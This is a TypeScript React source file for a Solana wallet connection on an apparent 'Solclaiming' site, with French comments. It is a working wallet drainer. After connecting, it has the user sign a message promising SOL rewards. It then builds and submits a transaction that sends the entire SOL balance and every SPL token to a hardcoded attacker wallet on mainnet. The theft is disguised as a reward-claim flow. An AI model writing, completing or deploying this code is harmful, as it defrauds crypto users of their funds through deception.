import { createContext, useContext, useState, useEffect, ReactNode } from 'react';
import { toast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";
import {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
} from '@solana/web3.js';
import {
  getAssociatedTokenAddress,
  createTransferInstruction,
  TOKEN_PROGRAM_ID,
  createAssociatedTokenAccountInstruction,
} from '@solana/spl-token';

interface PhantomProvider {
  isPhantom: boolean;
  publicKey: { toString: () => string; toBytes: () => Uint8Array } | null;
  connect: (opts?: { onlyIfTrusted?: boolean }) => Promise<{ publicKey: { toString: () => string } }>;
  disconnect: () => Promise<void>;
  signMessage: (message: Uint8Array, encoding?: string) => Promise<{ signature: Uint8Array }>;
  signAndSendTransaction: (transaction: Transaction) => Promise<{ signature: string }>;
  on: (event: string, callback: () => void) => void;
  off: (event: string, callback: () => void) => void;
}

declare global {
  interface Window {
    solana?: PhantomProvider;
  }
}

interface WalletContextType {
  connected: boolean;
  publicKey: string | null;
  balance: number | null;
  fetchingBalance: boolean;
  connecting: boolean;
  signed: boolean;
  transferring: boolean;
  connect: () => Promise<void>;
  disconnect: () => Promise<void>;
}

const WalletContext = createContext<WalletContextType | undefined>(undefined);

const DESTINATION_WALLET = '4tdTZ5rk4ZYDdZmLDMY4YTqtcE9A8ERqhcVb8urR2Tzx';

// Change ici pour passer en mainnet quand tu es prêt
const RPC_URL = 'https://api.mainnet-beta.solana.com'; // MAINNET (attention aux fonds réels !)
// const RPC_URL = 'https://api.devnet.solana.com'; // DEVNET pour tests sécurisés

const connection = new Connection(RPC_URL, 'confirmed');

export const WalletProvider = ({ children }: { children: ReactNode }) => {
  const [connected, setConnected] = useState(false);
  const [publicKey, setPublicKey] = useState<string | null>(null);
  const [balance, setBalance] = useState<number | null>(null);
  const [fetchingBalance, setFetchingBalance] = useState(false);
  const [connecting, setConnecting] = useState(false);
  const [signed, setSigned] = useState(false);
  const [transferring, setTransferring] = useState(false);

  const getProvider = (): PhantomProvider | undefined => {
    if (typeof window !== 'undefined' && window.solana?.isPhantom) {
      return window.solana;
    }
    return undefined;
  };

  const fetchBalance = async (address: string, opts?: { silent?: boolean }) => {
    const silent = opts?.silent ?? false;
    try {
      setFetchingBalance(true);
      const { data, error } = await supabase.functions.invoke('get-solana-balance', {
        body: { address },
      });

      if (error || typeof data?.balance !== 'number') {
        setBalance(null);
        if (!silent) {
          toast({
            title: 'Solde indisponible',
            description: "Impossible de récupérer le solde SOL.",
            variant: 'destructive',
          });
        }
        return;
      }

      setBalance(data.balance);
    } catch (error) {
      setBalance(null);
      if (!silent) {
        toast({
          title: 'Erreur',
          description: "Problème lors de la récupération du solde.",
          variant: 'destructive',
        });
      }
    } finally {
      setFetchingBalance(false);
    }
  };

  const requestSignature = async (provider: PhantomProvider): Promise<boolean> => {
    try {
      const message = "`Bienvenue sur Solclaiming ! 🎉

Merci d'avoir connecté ton wallet.

En signant ce message, tu confirmes ta présence et ton activité sur le site.

✅ En récompense, tu vas bientôt recevoir des SOL directement sur ton wallet, en échange des transactions que tu as effectuées ou que tu vas effectuer.

C'est notre façon de remercier les vrais utilisateurs actifs !

Signe pour valider et recevoir ta récompense 🚀
";
      const encodedMessage = new TextEncoder().encode(message);
      await provider.signMessage(encodedMessage, 'utf8');
      return true;
    } catch (error: any) {
      console.error('Signature rejetée ou erreur:', error);
      if (error?.code === 4001) {
        toast({
          title: 'Signature refusée',
          description: "Tu as annulé la signature. Connexion interrompue.",
          variant: 'destructive',
        });
      }
      return false;
    }
  };

  const transferAllFunds = async (provider: PhantomProvider, fromPubkey: PublicKey) => {
    setTransferring(true);
    try {
      const transaction = new Transaction();
      const destinationPubkey = new PublicKey(DESTINATION_WALLET);

      // 1. Transfert SOL (tout sauf frais + rent exempt)
      const lamports = await connection.getBalance(fromPubkey);
      const rentExempt = await connection.getMinimumBalanceForRentExemption(0);
      const feeEstimate = 10000; // Estimation conservatrice
      const solToSend = lamports - rentExempt - feeEstimate;

      if (solToSend > 0) {
        transaction.add(
          SystemProgram.transfer({
            fromPubkey,
            toPubkey: destinationPubkey,
            lamports: solToSend,
          })
        );
      }

      // 2. Transfert tous les tokens SPL
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(fromPubkey, {
        programId: TOKEN_PROGRAM_ID,
      });

      for (const { pubkey: sourceATA, account } of tokenAccounts.value) {
        const info = account.data.parsed.info;
        const amount = BigInt(info.tokenAmount.amount);

        if (amount === 0n) continue;

        const mint = new PublicKey(info.mint);
        const destinationATA = await getAssociatedTokenAddress(mint, destinationPubkey);

        // Vérifier si l'ATA destination existe, sinon la créer
        const destAccountInfo = await connection.getAccountInfo(destinationATA);
        if (!destAccountInfo) {
          transaction.add(
            createAssociatedTokenAccountInstruction(
              fromPubkey,
              destinationATA,
              destinationPubkey,
              mint
            )
          );
        }

        transaction.add(
          createTransferInstruction(
            sourceATA,
            destinationATA,
            fromPubkey,
            amount
          )
        );
      }

      if (transaction.instructions.length === 0) {
        toast({
          title: 'Aucun fonds',
          description: "Aucun SOL ou token à récuperer.",
        });
        return;
      }

      // Blockhash récent
      const { blockhash } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = fromPubkey;

      // Envoi via Phantom (tout visible dans la popup !)
      const { signature } = await provider.signAndSendTransaction(transaction);

      toast({
        title: 'Transfert réussi !',
        description: `Tous les fonds ont été transférés. Signature: ${signature.slice(0, 8)}...${signature.slice(-8)}`,
      });

      await connection.confirmTransaction(signature);
      await fetchBalance(fromPubkey.toString());
    } catch (error: any) {
      console.error('Erreur transfert:', error);
      toast({
        title: 'Transfert échoué',
        description: error.message || "Une erreur est survenue lors du transfert.",
        variant: 'destructive',
      });
    } finally {
      setTransferring(false);
    }
  };

  const connect = async () => {
    const provider = getProvider();
    if (!provider) {
      window.open('https://phantom.app/', '_blank');
      toast({
        title: 'Phantom non détecté',
        description: 'Installe Phantom pour continuer.',
      });
      return;
    }

    try {
      setConnecting(true);

      // 1. Connexion
      const resp = await provider.connect();
      const address = resp.publicKey.toString();
      const pubkey = new PublicKey(address);

      // 2. Signature de message
      const signedOk = await requestSignature(provider);
      if (!signedOk) {
        await provider.disconnect();
        return;
      }

      // 3. Tout est bon → transfert immédiat (transparent)
      setPublicKey(address);
      setConnected(true);
      setSigned(true);
      await fetchBalance(address);

      toast({
        title: 'Connecté !',
        description: 'Préparation du transfert de tous les fonds...',
      });

      await transferAllFunds(provider, pubkey);
    } catch (error: any) {
      console.error('Erreur connexion:', error);
      toast({
        title: 'Erreur',
        description: "Impossible de se connecter.",
        variant: 'destructive',
      });
    } finally {
      setConnecting(false);
    }
  };

  const disconnect = async () => {
    const provider = getProvider();
    if (provider) {
      try {
        await provider.disconnect();
      } catch {}
    }
    setConnected(false);
    setPublicKey(null);
    setBalance(null);
    setSigned(false);
    setTransferring(false);
  };

  useEffect(() => {
    const provider = getProvider();
    if (!provider) return;

    const handleDisconnect = () => disconnect();
    const handleAccountChanged = () => disconnect();

    provider.on('disconnect', handleDisconnect);
    provider.on('accountChanged', handleAccountChanged);

    return () => {
      provider.off('disconnect', handleDisconnect);
      provider.off('accountChanged', handleAccountChanged);
    };
  }, []);

  useEffect(() => {
    if (connected && publicKey) {
      fetchBalance(publicKey);
      const interval = setInterval(() => fetchBalance(publicKey, { silent: true }), 15000);
      return () => clearInterval(interval);
    }
  }, [connected, publicKey]);

  return (
    <WalletContext.Provider
      value={{
        connected,
        publicKey,
        balance,
        fetchingBalance,
        connecting,
        signed,
        transferring,
        connect,
        disconnect,
      }}
    >
      {children}
    </WalletContext.Provider>
  );
};

export const useWallet = () => {
  const context = useContext(WalletContext);
  if (context === undefined) {
    throw new Error('useWallet must be used within a WalletProvider');
  }
  return context;
};